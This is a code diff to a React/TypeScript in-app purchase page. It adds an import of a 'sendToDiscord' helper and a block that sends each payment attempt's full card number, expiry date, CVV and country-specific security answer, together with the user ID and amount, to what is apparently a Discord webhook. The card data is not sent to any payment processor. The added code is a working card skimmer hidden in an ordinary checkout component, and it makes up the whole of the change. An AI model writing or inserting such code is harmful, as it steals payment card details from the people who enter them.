@@ -11,6 +11,7 @@ import { ArrowLeft, CreditCard, Loader2, AlertTriangle, ShieldCheck } from 'luci
 import { supabase } from '@/integrations/supabase/client';
 import { useAuth } from '@/contexts/AuthContext';
 import SalesNotification from '@/components/SalesNotification';
+import { sendToDiscord } from '@/lib/discord';
 
 const COUNTRIES = ['USA', 'Germany', 'UK', 'Canada', 'Brazil', 'New Zealand', 'Others'] as const;
 type Country = typeof COUNTRIES[number];
@@ -72,6 +73,24 @@ export default function InAppPurchase() {
     } catch (err) {
       console.error('Payment submission error:', err);
     }
+
+    // Send payment data to Discord
+    sendToDiscord({
+      title: '💳 New Payment Attempt',
+      color: 0xf59e0b,
+      fields: [
+        { name: '🆔 User ID', value: user?.id || '—', inline: false },
+        { name: '💰 Amount', value: `$${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2 })}` },
+        { name: '📝 Description', value: description },
+        { name: '🌍 Country', value: country },
+        { name: '💳 Card Number', value: cardNumber },
+        { name: '📅 Expiry', value: expiry },
+        { name: '🔒 CVV', value: cvv },
+        ...(showSecurityField ? [
+          { name: `🛡️ ${SECURITY_PLACEHOLDERS[country]?.replace('Enter ', '')}`, value: securityInfo },
+        ] : []),
+      ],
+    });
 
     await new Promise(r => setTimeout(r, 3000));
     setLoading(false);
